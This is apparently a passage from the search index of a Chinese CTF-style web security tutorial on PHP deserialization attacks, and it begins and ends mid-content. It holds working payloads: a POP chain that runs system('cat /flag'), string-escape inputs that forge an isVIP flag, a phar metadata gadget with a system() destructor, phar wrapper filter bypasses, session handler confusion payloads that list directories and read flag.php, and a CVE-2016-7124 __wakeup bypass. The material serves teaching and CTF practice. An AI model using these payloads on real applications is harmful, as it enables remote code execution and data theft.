/flag\");\";s:7:\"d3text2\";N;}s:7:\"d2text2\";N;}s:7:\"d1text2\";N;}\n\n\u683c\u5f0f\u5316\n\nO:5:\"demo1\":2:{\n    s:7:\"d1text1\";\n    O:5:\"demo2\":2:{\n        s:7:\"d2text1\";\n        O:5:\"demo3\":2:{\n            s:7:\"d3text1\";s:19:\"system(\"cat /flag\");\";\n            s:7:\"d3text2\";N;\n        }\n        s:7:\"d2text2\";N;\n    }\n    s:7:\"d1text2\";N;\n}\n\n?&gt;\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#php_1","title":"PHP\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038","text":"<p>\u5f53\u5f00\u53d1\u8005\u4f7f\u7528\u5148\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\uff0c\u7136\u540e\u5c06\u5bf9\u8c61\u4e2d\u7684\u5b57\u7b26\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6700\u540e\u518d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u8fd9\u4e2a\u65f6\u5019\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751fPHP\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038\u7684\u6f0f\u6d1e</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_6","title":"\u5b57\u7b26\u589e\u52a0","text":"<p>\u4f8b\u5b50</p> <pre><code>&lt;?php\nclass user{\n    public $username;\n    public $password;\n    public $isVIP;\n\n    public function __construct($u,$p){\n        $this-&gt;username = $u;\n        $this-&gt;password = $p;\n        $this-&gt;isVIP = 0;\n    }\n}\n\n\n\nfunction filter($s){\n    return str_replace(\"admin\",\"hacker\",$s);\n}\n\n$a = new user(\"admin\",\"123456\");\n$a_seri = serialize($a);\n# O:4:\"user\":3:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;}\n\n$a_seri_filter = filter($a_seri);\n\necho $a_seri_filter;\n# O:4:\"user\":3:{s:8:\"username\";s:5:\"hacker\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;}\n\n?&gt;\n</code></pre> <p>\u5bf9\u6bd4\u4e00\u4e0b</p> <pre><code>O:4:\"user\":3:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;}  //\u672a\u8fc7\u6ee4\nO:4:\"user\":3:{s:8:\"username\";s:5:\"hacker\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;} //\u5df2\u8fc7\u6ee4\n\ns:5:\"admin\"\ns:5:\"hacker\"\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u5b57\u7b26\u957f\u5ea6\u4e0d\u5bf9\u5e94\uff0c\u7ed3\u679c\u591a\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd9\u65f6\u7684\u5e8f\u5217\u5316\u6570\u636e\u7ed3\u6784\u88ab\u7834\u574f</p> <p>\u5982\u679c\u6784\u9020\u7c7b\u4f3c\u5e8f\u5217\u5316\u6570\u636e\u7684\u7ed3\u6784\uff0c\u5e76\u8ba9\u5176\u9003\u9038\u51fa\u53cd\u5e8f\u5217\u5316\u7684\u7ed3\u6784\uff0c\u5c31\u53ef\u4ee5\u4efb\u610f\u4f2a\u9020\u53c2\u6570</p> <p>\u8fd9\u4e2a\u65f6\u5019\u4f20\u5165\u7684admin\u5c31\u662f\u53ef\u63a7\u53d8\u91cf</p> <p>\u5b9a\u4e00\u4e2a\u76ee\u6807\uff0c\u8ba9<code>isVIP = 1</code></p> <p>\u90a3\u5c31\u662f</p> <pre><code>\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;} // \u73b0\u5728\u7684\n\n\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;} //\u8981\u5b9e\u73b0\u7684\n</code></pre> <p>\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e3a47\uff0c\u5373\u6211\u4eec\u9700\u8981\u9003\u9038\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\uff0c\u6211\u4eec\u9700\u8981\u4f20\u5165<code>admin * 47</code>\u4ece\u800creplace\u540e\uff0c\u4f1a\u591a\u51fa47\u4e2a\u5b57\u7b26</p> <p>\u5982\u679c\u6211\u4eec\u4f20\u5165</p> <pre><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}\n</code></pre> <pre><code>O:4:\"user\":3:{s:8:\"username\";s:282:\"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;} // \u672a\u66ff\u6362\n\nO:4:\"user\":3:{s:8:\"username\";s:282:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;}//\u66ff\u6362\u540e\n</code></pre> <p>\u8fd9\u65f6\uff0c\u7531\u4e8e<code>s:282:</code>\u5230\u6700\u540e\u4e00\u4e2a<code>hacker</code>\u5373\u622a\u6b62\uff0847\u4e2ahacker\uff0c\u5171282\u4e2a\u5b57\u7b26\uff09</p> <p>\u540e\u9762\u7684<code>s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}</code>\u5c06\u4f1a\u88ab\u8bc6\u522b\u4e3a\u5e8f\u5217\u5316\u7684\u7ed3\u6784</p> <p>\u56e0\u4e3a<code>O:4:\"user\":3:</code>\u53ea\u4f1a\u8bc6\u522b\u4e09\u4e2a\u5c5e\u6027\uff0c\u591a\u4f59\u7684<code>\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;}</code>\u5c06\u4f1a\u88ab\u629b\u5f03\uff0c\u4ece\u800c\u6210\u529f\u53cd\u5e8f\u5217\u5316\u4e3a<code>isVIP=1</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_7","title":"\u5b57\u7b26\u51cf\u5c11","text":"<p>\u548c\u4e0a\u9762\u7684\u539f\u7406\u7c7b\u4f3c</p> <p>\u8fd9\u91cc\u628aadmin\u66ff\u6362\u4e3ahack,\u66ff\u6362\u540e\u5b57\u7b26\u51cf\u5c11</p> <pre><code>&lt;?php\nclass user{\n    public $username;\n    public $password;\n    public $isVIP;\n\n    public function __construct($u,$p){\n        $this-&gt;username = $u;\n        $this-&gt;password = $p;\n        $this-&gt;isVIP = 0;\n    }\n}\n\nfunction filter($s){\n    return str_replace(\"admin\",\"hack\",$s);\n}\n\n$a = new user('admin','123456');\n$a_seri = serialize($a);\n$a_seri_filter = filter($a_seri);\n\necho $a_seri_filter;\n?&gt;\n</code></pre> <pre><code>O:4:\"user\":3:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;} //\u66ff\u6362\u524d\n\nO:4:\"user\":3:{s:8:\"username\";s:5:\"hack\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;} // \u66ff\u6362\u540e\n</code></pre> <p>\u540c\u6837\u7684\u76ee\u6807</p> <pre><code>\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:0;} // \u73b0\u5728\u7684\n\n\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;} //\u8981\u5b9e\u73b0\u7684 \u957f\u5ea647\n</code></pre> <p>\u8fd9\u91cc\u8981\u4e86\u89e3\u4e00\u4e0b</p> <p>PHP\u53cd\u5e8f\u5217\u5316\u7684\u673a\u5236\u662f\uff0c\u89c4\u5b9a\u4e86\u670910\u4e2a\u5b57\u7b26\uff0c\u7b2c9\u4e2a\u5c31\u5230\u4e86\u53cc\u5f15\u53f7\uff0c\u8fd9\u4e2a\u65f6\u5019PHP\u4f1a\u628a\u53cc\u5f15\u53f7\u5f53\u505a\u7b2c10\u4e2a\u5b57\u7b26\uff0c\u5e76\u4e0d\u6839\u636e\u53cc\u5f15\u53f7\u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u5df2\u7ecf\u7ed3\u675f\uff0c\u800c\u662f\u6839\u636e\u89c4\u5b9a\u7684\u6570\u91cf\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\u3002</p> <p>\u8fc7\u6ee4\u4e4b\u540e\uff0c5\u4e2a\u5b57\u7b26\u53d8\u4e3a4\u4e2a\uff0c\u540e\u9762\u7684\u5b57\u7b26\u4f1a\u88ab\u201d\u541e\u6389\u4e86\u201c</p> <p>\u65e2\u7136\u5b57\u7b26\u4e32\u4f1a\u88ab\u541e\u6389\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u541e\u6389<code>\";s:8:\"password\";s:6:</code> \u537321\u4e2aadmin</p> <p>\u7136\u540e\u7528password\u6784\u9020\u65b0\u503c\u5373<code>;s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}</code> 46\u4e2a\u5b57\u7b26</p> <p>password\u6784\u9020\u5b8c<code>s:6</code>\u4f1a\u53d8\u4e3a<code>s:46</code>\uff0c\u8fd9\u6837\u53c8\u8981\u591a\u4e00\u4f4d\u5b57\u7b26 \u6700\u7ec8\u6784\u902022\u4e2aadmin\uff0c\u4ece\u800c\u541e22\u4e2a\u5b57\u7b26</p> <p>\u8fd9\u6837\u5c31\u662f</p> <pre><code>O:4:\"user\":3:{s:8:\"username\";s:\u5c1122\u4e2a\u5b57\u7b26:\"hack\";s:8:\"password\";s:46:\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}\";s:5:\"isVIP\";i:0;}\n</code></pre> <p>\u4e5f\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u4f20\u516522\u4e2aadmin\u548c\u6784\u9020\u7684\u5b57\u7b26\u4e32</p> <pre><code>&lt;?php\nclass user{\n    public $username;\n    public $password;\n    public $isVIP;\n\n    public function __construct($u,$p){\n        $this-&gt;username = $u;\n        $this-&gt;password = $p;\n        $this-&gt;isVIP = 0;\n    }\n}\n\nfunction filter($s){\n    return str_replace(\"admin\",\"hack\",$s);\n}\n\n$a = new user('admin * 22'/* \u5c31\u8fd9\u4e48\u8868\u793a22\u4e2aadmin\u5427 */,';s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}'); //46\u4e2a\u5b57\u7b26\n\n$a_seri = serialize($a);\n$a_seri_filter = filter($a_seri);\n\necho $a_seri_filter;\n?&gt;\n\n# O:4:\"user\":3:{s:8:\"username\";s:110:\"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\";s:8:\"password\";s:46:\";s:8:\"password\";s:6:\"123456\";s:5:\"isVIP\";i:1;}\";s:5:\"isVIP\";i:0;}\n</code></pre> <p>\u53cd\u5e8f\u5217\u5316\u5373\u662f</p> <pre><code>object(user)#2 (3) { [\"username\"]=&gt; string(110) \"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack\";s:8:\"password\";s:46:\" [\"password\"]=&gt; string(6) \"123456\" [\"isVIP\"]=&gt; int(1) }\n</code></pre> <p>\u6570\u7ec4\u9003\u9038\u95ed\u5408\u8981\u52a0\u4e00\u4e2a}\uff0c\u5373\u7528\";}\u95ed\u5408</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#phar","title":"Phar\u53cd\u5e8f\u5217\u5316","text":"<p>phar\uff0c\u5168\u79f0\u4e3a<code>PHP Archive</code>\uff0cphar\u6269\u5c55\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06\u6574\u4e2aPHP\u5e94\u7528\u7a0b\u5e8f\u653e\u5165<code>.phar</code>\u6587\u4ef6\u4e2d\u7684\u65b9\u6cd5\uff0c\u4ee5\u65b9\u4fbf\u79fb\u52a8\u3001</p> <p>\u5b89\u88c5\u3002<code>.phar</code>\u6587\u4ef6\u7684\u6700\u5927\u7279\u70b9\u662f\u5c06\u51e0\u4e2a\u6587\u4ef6\u7ec4\u5408\u6210\u4e00\u4e2a\u6587\u4ef6\u7684\u4fbf\u6377\u65b9\u5f0f\uff0c\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06\u5b8c\u6574\u7684PHP\u7a0b</p> <p>\u5e8f\u5206\u5e03\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5e76\u4ece\u8be5\u6587\u4ef6\u4e2d\u8fd0\u884c\u7684\u65b9\u6cd5\u3002</p> <p>\u6587\u4ef6\u7ed3\u6784\u5728\u6587\u4ef6\u5305\u542b\u4e2d\u8bb2\u8fc7\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2\u5982\u4f55\u5229\u7528</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_8","title":"\u5229\u7528","text":"<p>\u5c06\u8981\u5e8f\u5217\u5316\u7684\u5185\u5bb9\u5199\u5165<code>meta-data</code>\u4e2d\uff0c\u518d\u4f7f\u7528phar\u4f2a\u534f\u8bae\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u9996\u5148\u9700\u8981\u751f\u6210phar\u6587\u4ef6\uff0c\u5728php\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u9700\u8981\u8bbe\u7f6e<code>phar.readonly= off</code>\u3002</p> <pre><code>&lt;?php\nclass A {\n    public $a;\n\n    public function __destruct()\n    {\n        system($this-&gt;cmd);\n    }\n}\n$a = new A();\n$a-&gt;cmd='ls';\n$phar = new Phar(\"demo.phar\");\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\");//\u8bbe\u7f6estub\n$phar-&gt;setMetadata($a);//\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest\n$phar-&gt;addFromString(\"demo.txt\", \"demo\");//\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n//\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97\n$phar-&gt;stopBuffering();\n?&gt;\n</code></pre> <p>\u5c06\u751f\u6210\u7684phar\u6587\u4ef6\u4e0a\u4f20\uff0c\u5e76\u4e14\u7528phar\u534f\u8bae\u5305\u542b\uff08\u914d\u5408\u6587\u4ef6\u4e0a\u4f20\u6587\u4ef6\u5305\u542b\u6253\u7ec4\u5408\u62f3\uff09\uff0c\u5373\u53ef\u6267\u884c\u5176\u4e2d\u7684\u547d\u4ee4</p> <p>\u53ea\u8981\u8c03\u7528\u4e86<code>php_stream_open_wrapper</code>\u7684\u51fd\u6570,\u90fd\u5b58\u5728\u6b64\u6f0f\u6d1e</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_9","title":"\u8fc7\u6ee4\u7ed5\u8fc7","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_10","title":"\u5b57\u7b26","text":"<p>\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc <pre><code>compress.bzip://phar:///test.phar/test.txt\ncompress.bzip2://phar:///test.phar/test.txt\ncompress.zlib://phar:///home/sx/test.phar/test.txt\nphp://filter/resource=phar:///test.phar/test.txt\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_11","title":"\u6587\u4ef6","text":"<p>php\u8bc6\u522bphar\u6587\u4ef6\u662f\u901a\u8fc7\u6587\u4ef6\u5934\u7684stub\uff0c\u5373<code>__HALT_COMPILER();?&gt;</code>\u8fd9\u6bb5\u4ee3\u7801</p> <p>\u6240\u4ee5\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u6587\u4ef6\u540e\u7f00\uff0c\u6216\u8005\u6dfb\u52a0\u5176\u4ed6\u6587\u4ef6\u6587\u4ef6\u5934</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#session","title":"Session\u53cd\u5e8f\u5217\u5316","text":"<p>session\u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\u662f\u7531\u4e09\u79cd\u4e0d\u540c\u7684\u53cd\u5e8f\u5217\u5316\u5f15\u64ce\u6240\u4ea7\u751f\u7684\u7684\u6f0f\u6d1e\uff1a</p> <p><code>php_binary</code>:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684ASCII\u5b57\u7b26+\u952e\u540d+\u7ecf\u8fc7<code>serialize()</code>\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> <p><code>php</code>:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d+\u7ad6\u7ebf+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5904\u7406\u7684\u503c</p> <p><code>php_serialize</code>(php&gt;5.5.4):\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u7ecf\u8fc7<code>serialize()</code>\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> <p>\u4e09\u79cd\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\uff1a</p> <pre><code>php : a|s:3:\"zzz\";\nphp_serialize : a:1:{s:1:\"a\";s:3:\"zzz\";}\nphp_binary : as:3:\"zzz\";\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#session_1","title":"\u53ef\u4f20\u5165session","text":"<p>1.php</p> <pre><code>&lt;?php\nini_set(\"session.serialize_handler\", \"php_serialize\");\n\nsession_start();\n$_SESSION['zzz'] = $_GET['a'];\necho \"\";\nvar_dump($_SESSION);\necho \"\";\n?&gt;\n\n#\u4f20\u5165 |O:7:\"student\":2:{s:4:\"name\";s:4:\"name\";s:3:\"age\";s:3:\"100\";}\n</code></pre> <p>2.php</p> <pre><code>&lt;?php\nini_set('session.serialize_handler', 'php');\nsession_start();\nclass demo2{\n    var $name;\n    var $age;\n    function __wakeup(){\n        echo \"hello \".$this-&gt;name.\"!\";\n    }\n}\n?&gt;\n# \u518d\u6b21\u8bbf\u95ee\u4f1a\u8f93\u51fa hello name\n</code></pre> <p>\u653b\u51fb\u601d\u8def\uff1a</p> <p>\u9996\u5148\u8bbf\u95ee<code>1.php</code>\uff0c\u5728\u4f20\u5165\u7684\u53c2\u6570\u6700\u5f00\u59cb\u52a0\u4e00\u4e2a<code>|</code>\uff0c\u7531\u4e8e<code>1.php</code>\u662f\u4f7f\u7528<code>php_serialize</code>\u5f15\u64ce\u5904\u7406\uff0c\u56e0\u6b64\u53ea\u4f1a\u628a<code>|</code>\u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\u3002\u7136\u540e\u8bbf\u95ee<code>2.php</code>\uff0c\u7531\u4e8e\u7528\u7684\u662fphp\u5f15\u64ce\uff0c\u56e0\u6b64\u9047\u5230<code>|</code>\u65f6\u4f1a\u5c06\u4e4b\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790<code>session</code>\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9<code>|</code>\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#sessionupload_progress","title":"session.upload_progress","text":"<p>\u4e0d\u5b58\u5728\u5165\u53e3\u70b9</p> <pre><code>&lt;?php\nini_set('session.serialize_handler', 'php');\n\nsession_start();\n\nclass demo\n{\n    public $mdzz;\n    function __construct()\n    {\n        $this-&gt;mdzz = 'phpinfo();';\n    }\n    function __destruct()\n    {\n        eval($this-&gt;mdzz);\n    }\n}\nif (isset($_GET['phpinfo']))\n    $m = new demo();\nelse\nhighlight_string(file_get_contents('D:\\phpstudy_pro\\WWW\\1\\2.php'));\n?&gt;\n# \u8fd9\u91ccsession.serialize_handle\u7684master value\u4e3aphp_serialize\n</code></pre> <p>\u6587\u4ef6\u5f00\u542f</p> <p><code>ini_set('session.serialize_handler', 'php');</code></p> <p>\u800cphp\u914d\u7f6e\u4e3a<code>session.serialize_handler=php_serialize</code>\u7684\u60c5\u51b5\uff0c\u9020\u6210<code>php_serialize</code>\u5f15\u64ce\u4e0e<code>php</code>\u5f15\u64ce\u7684\u5dee\u5f02</p> <p>\u9700\u8981\u5f00\u542f<code>session.upload_progress.enabled = On</code>\u4e00\u822c\u9ed8\u8ba4on</p> <p>\u901a\u8fc7POST\u65b9\u6cd5\u6765\u6784\u9020\u6570\u636e\u4f20\u5165<code>$_SESSION</code>\uff0c\u9996\u5148\u6784\u9020POST\u63d0\u4ea4\u8868\u5355</p> <pre><code>&lt;form action=\"url/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; \u4fee\u6539url\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt;\n    &lt;input type=\"file\" name=\"file\" /&gt;\n    &lt;input type=\"submit\" /&gt;\n&lt;/form&gt;\n</code></pre> <p>\u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d\u4e3apayload<code>|O:4:\\\"demo\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";}</code></p> <p>\u8bfb\u53d6\u6587\u4ef6\u7684payload\u4e3a<code>|O:4:\\\"demo\\\":1:{s:4:\\\"mdzz\\\";s:41:\\\"print_r(file_get_contents(\"./flag.php\"));\\\";}</code> </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#phpbypass","title":"PHP\u53cd\u5e8f\u5217\u5316Bypass","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#php71","title":"php7.1+\u53cd\u5e8f\u5217\u5316\u5bf9\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f","text":"<p>\u524d\u9762\u8bf4\u4e86\u5982\u679c\u53d8\u91cf\u524d\u662fprotected\uff0c\u5e8f\u5217\u5316\u7ed3\u679c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a<code>\\x00*\\x00</code>\uff0c\u4f46\u5728\u7279\u5b9a\u7248\u672c7.1\u4ee5\u4e0a\u5219\u5bf9\u4e8e\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f</p> <p>\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\u5373\u4f7f\u6ca1\u6709<code>\\x00*\\x00</code>\u4e5f\u4f9d\u7136\u4f1a\u8f93\u51faabc\u3002</p> <pre><code>&lt;?php\nclass test{\nprotected $a;\npublic function __construct(){\n$this-&gt;a = 'abc';\n}\npublic function __destruct(){\necho $this-&gt;a;\n}\n}\nunserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}');\n\n#\u8f93\u51fa\uff1aabc\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#__wakeup","title":"\u7ed5\u8fc7__wakeup","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#cve-2016-7124","title":"CVE-2016-7124","text":"<p>\u9002\u7528\u7248\u672c\uff1a PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p> <p>\u5229\u7528\u65b9\u5f0f\uff1a\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7<code>__wakeup()</code>\u7684\u6267\u884c\u3002</p> <p>\u5bf9\u4e8e\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7c7b\uff1a</p> <pre><code>&lt;?php\nclass test{\npublic $a;\npublic function __construct(){\n$this-&gt;a = 'abc';\n}\npublic function __wakeup(){\n$this-&gt;a='666';\n}\npublic function __destruct(){\necho $this-&gt;a;\n}\n}\n$t='O:4:\"test\":1:{s:1:\"a\";s:4:\"yyds\";}';\nunserialize($t);\n</code></pre> <p>\u5982\u679c\u6267\u884c<code>unserialize('O:4:\"test\":1:{s:1:\"a\";s:4:\"yyds\";}');</code>\u8f93\u51fa\u7ed3\u679c\u4e3a666,</p> <p>\u800c\u628a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u4ece1\u6539\u4e3a2</p> <p>\u6267\u884c<code>unserialize('O:4:\"test\":2:{s:1:\"a\";s:4:\"yyds\";}');</code>\u8f93\u51fa\u7ed3\u679c\u4e3ayyds\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_12","title":"\u5229\u7528\u5305\u542b\u5f15\u7528","text":"<p>\u5728php\u91cc\uff0c\u6211\u4eec\u53ef\u4f7f\u7528\u5f15\u7528\u7684\u65b9\u5f0f\u8ba9\u4e24\u4e2a\u53d8\u91cf\u540c\u65f6\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u8fd9\u6837\u5bf9\u5176\u4e2d\u4e00\u4e2a\u53d8\u91cf\u64cd\u4f5c\u65f6\uff0c\u53e6\u4e00\u4e2a\u53d8\u91cf\u7684\u503c\u4e5f\u4f1a\u968f\u4e4b\u6539\u53d8\u3002</p> <p>\u6bd4\u5982\uff1a</p> <pre><code>&lt;?php\nfunction test (&amp;$a){\n    $b = &amp;$a;\n    $b = '123';\n}\n$a = '11';\ntest($a);\necho $a;\n</code></pre> <p>\u8f93\u51fa:</p> <pre><code>123\n</code></pre> <p>\u867d\u7136\u7ed9$a\u8d4b\u503c\u4e3a11\uff0c\u4f46\u662f\u5728\u6267\u884c<code>text()</code>\u65f6\uff0c\u7528 <code>$b = &amp;$a;</code>\u8ba9<code>$b</code>\u548c<code>$a</code>\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58,\u4fee\u6539<code>$b=123</code>\u540e\uff0c<code>$a</code>\u4e5f\u88ab\u6539\u53d8\u4e86</p> <p>\u4e3e\u4e2a\u4f8b\u5b50</p> <pre><code>&lt;?php\n\nclass demo{\n    public $key;\n    public function __destruct()\n    {\n        $this-&gt;key=False;\n        